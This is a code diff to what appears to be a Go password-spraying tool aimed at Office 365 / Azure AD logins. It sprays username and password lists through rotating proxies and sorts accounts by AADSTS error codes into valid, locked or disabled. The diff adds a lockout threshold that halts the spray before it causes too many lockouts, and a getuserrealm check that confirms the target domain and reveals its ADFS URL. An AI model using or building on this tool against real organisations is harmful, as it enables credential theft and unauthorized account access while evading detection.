@@ -95,6 +95,13 @@ const (
      -url <string>          Endpoint to send requests to
                               - Amazon API Gateway 'Invoke URL'
                               (-url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login)
+     -lt <int>		    Number of account lockout responses before the spray is terminated
+				- Default: 10 lockouts
+				(-lt 5)
+     -v			    Validate whether the domain is using O365 via the GetUserRealm 
+				- Exits program if response is unkown
+				- prints out the ADFS Auth URL if Federated authentication
+
      -debug                 Debug mode.
                               - Print xml response
 
@@ -128,9 +135,68 @@ func randomProxy(proxies []string) string {
 	return proxy
 }
 
-func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
+func validate(domain string) bool {
+	var url string
+
+	//valid = false
+	url = "https://login.microsoftonline.com/getuserrealm.srf?login=user" + domain + "&xml=1"
+
+	client := &http.Client{}
+	request, err := http.NewRequest("GET", url, nil)
+	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
+	if err != nil {
+		panic(err)
+	}
+
+	// Send http request
+	response, err := client.Do(request)
+	if err != nil {
+		panic(err)
+	}
+	defer response.Body.Close()
+
+	// Read response
+	body, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		print(err)
+	}
+
+	// Parse response
+	xmlResponse := etree.NewDocument()
+	xmlResponse.ReadFromBytes(body)
+
+	// Read response codes
+	x := xmlResponse.FindElement("//NameSpaceType")
+	nameSpaceType := x.Text()
+
+	if nameSpaceType == "Federated" {
+		valid = true
+		authURL := xmlResponse.FindElement("//AuthURL")
+		color.Set(color.FgGreen)
+		fmt.Printf("The domain %s is using Federated O365 and the ADFS URL is: %s\n", domain, authURL.Text())
+		color.Unset()
+
+	} else if nameSpaceType == "Managed" {
+		valid = true
+		color.Set(color.FgGreen)
+		fmt.Printf("The domain %s is using Managed O365\n", domain)
+		color.Unset()
+
+	} else {
+		valid = false
+		color.Set(color.FgRed)
+		fmt.Printf("[-] The domain %s is NOT using O365\n", domain)
+		color.Unset()
+	}
+
+	return valid
+
+}
+
+func doTheStuff(un string, pw string, prox string) (string, color.Attribute, string) {
 	var returnString string
 	var returnColor color.Attribute
+	var returnCode string
 
 	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
 	<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
@@ -202,6 +268,7 @@ func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
 
 	// Read response codes
 	x := xmlResponse.FindElement("//psf:text")
+
 	if x == nil {
 		returnString = color.GreenString("[+] Possible valid login! " + un + " : " + pw)
 	} else if strings.Contains(x.Text(), "AADSTS50059") {
@@ -210,18 +277,23 @@ func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
 	} else if strings.Contains(x.Text(), "AADSTS50034") {
 		returnString = "[-] User not found: " + un
 		returnColor = color.FgRed
+		returnCode = "AADSTS50034"
 	} else if strings.Contains(x.Text(), "AADSTS50126") {
 		returnString = "[-] Valid user, but invalid password: " + un + " : " + pw
 		returnColor = color.FgYellow
+		returnCode = "AADSTS50126"
 	} else if strings.Contains(x.Text(), "AADSTS50056") {
 		returnString = "[!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
 		returnColor = color.FgYellow
+		returnCode = "AADSTS50056"
 	} else if strings.Contains(x.Text(), "AADSTS50053") {
 		returnString = "[-] Account locked out: " + un
 		returnColor = color.FgMagenta
+		returnCode = "AADSTS50053"
 	} else if strings.Contains(x.Text(), "AADSTS50057") {
 		returnString = "[-] Account disabled: " + un
 		returnColor = color.FgMagenta
+		returnCode = "AADSTS50057"
 	} else {
 		returnString = "[-] Unknown response. " + un + " : " + pw
 		returnColor = color.FgMagenta
@@ -231,24 +303,26 @@ func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
 		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
 	}
 
-	return returnString, returnColor
+	return returnString, returnColor, returnCode
 }
 
 type flagVars struct {
-	flagHelp         bool
-	flagUsername     string
-	flagUsernameFile string
-	flagDomain       string
-	flagPassword     string
-	flagPasswordFile string
-	flagUserPassFile string
-	flagDelay        int
-	flagWaitTime     int
-	flagProxy        string
-	flagProxyFile    string
-	flagOutFilePath  string
-	flagTargetURL    string
-	flagDebug        bool
+	flagHelp          bool
+	flagUsername      string
+	flagUsernameFile  string
+	flagDomain        string
+	flagPassword      string
+	flagPasswordFile  string
+	flagUserPassFile  string
+	flagDelay         int
+	flagWaitTime      int
+	flagLockoutThresh int
+	flagValidate      bool
+	flagProxy         string
+	flagProxyFile     string
+	flagOutFilePath   string
+	flagTargetURL     string
+	flagDebug         bool
 }
 
 func flagOptions() *flagVars {
@@ -261,6 +335,8 @@ func flagOptions() *flagVars {
 	flagUserPassFile := flag.String("up", "", "")
 	flagDelay := flag.Int("delay", 600, "")
 	flagWaitTime := flag.Int("w", 1, "")
+	flagLockoutThresh := flag.Int("lt", 10, "")
+	flagValidate := flag.Bool("v", false, "")
 	flagProxy := flag.String("proxy", "", "")
 	flagOutFilePath := flag.String("o", "", "")
 	flagProxyFile := flag.String("proxyfile", "", "")
@@ -270,20 +346,22 @@ func flagOptions() *flagVars {
 	flag.Parse()
 
 	return &flagVars{
-		flagHelp:         *flagHelp,
-		flagUsername:     *flagUsername,
-		flagUsernameFile: *flagUsernameFile,
-		flagDomain:       *flagDomain,
-		flagPassword:     *flagPassword,
-		flagPasswordFile: *flagPasswordFile,
-		flagUserPassFile: *flagUserPassFile,
-		flagDelay:        *flagDelay,
-		flagWaitTime:     *flagWaitTime,
-		flagProxy:        *flagProxy,
-		flagProxyFile:    *flagProxyFile,
-		flagOutFilePath:  *flagOutFilePath,
-		flagTargetURL:    *flagTargetURL,
-		flagDebug:        *flagDebug,
+		flagHelp:          *flagHelp,
+		flagUsername:      *flagUsername,
+		flagUsernameFile:  *flagUsernameFile,
+		flagDomain:        *flagDomain,
+		flagPassword:      *flagPassword,
+		flagPasswordFile:  *flagPasswordFile,
+		flagUserPassFile:  *flagUserPassFile,
+		flagDelay:         *flagDelay,
+		flagWaitTime:      *flagWaitTime,
+		flagLockoutThresh: *flagLockoutThresh,
+		flagValidate:      *flagValidate,
+		flagProxy:         *flagProxy,
+		flagProxyFile:     *flagProxyFile,
+		flagOutFilePath:   *flagOutFilePath,
+		flagTargetURL:     *flagTargetURL,
+		flagDebug:         *flagDebug,
 	}
 }
 
@@ -298,6 +376,7 @@ func main() {
 	var proxyList []string
 	var usernameList []string
 	var passwordList []string
+	var lockedAccounts int
 	var outFile *os.File
 	var err error
 
@@ -441,10 +520,27 @@ func main() {
 	// -debug
 	debug = opt.flagDebug
 
+	// -v
+	// if validate flag set validate the domain via getuserrealm
+	if opt.flagValidate && !validate(domain) {
+		fmt.Println()
+		os.Exit(0)
+	}
+
+	// initalize # of locked accounts
+	lockedAccounts = 0
+
 	// Iterate through passwords
 	for i, pass := range passwordList {
 		// Iterate through usernames
 		for j, user := range usernameList {
+
+			// kill the program if the lockout threshold is met
+			if lockedAccounts >= opt.flagLockoutThresh {
+				fmt.Println("Account Lockout Threshold met\nExiting...")
+				os.Exit(0)
+			}
+
 			// Add domain if username doesn't already have one
 			if !strings.Contains(user, "@") {
 				user = user + domain
@@ -456,12 +552,18 @@ func main() {
 			}
 
 			// Test username:password combo
-			result, col := doTheStuff(user, pass, randomProxy(proxyList))
+			result, col, code := doTheStuff(user, pass, randomProxy(proxyList))
 
 			// Print with color
 			color.Set(col)
 			fmt.Println(result)
 			color.Unset()
+
+			// increment Account Lockout counter based on failure code response
+			if code == "AADSTS50053" {
+				lockedAccounts += 1
+
+			}
 
 			// Write to file
 			if opt.flagOutFilePath != "" {
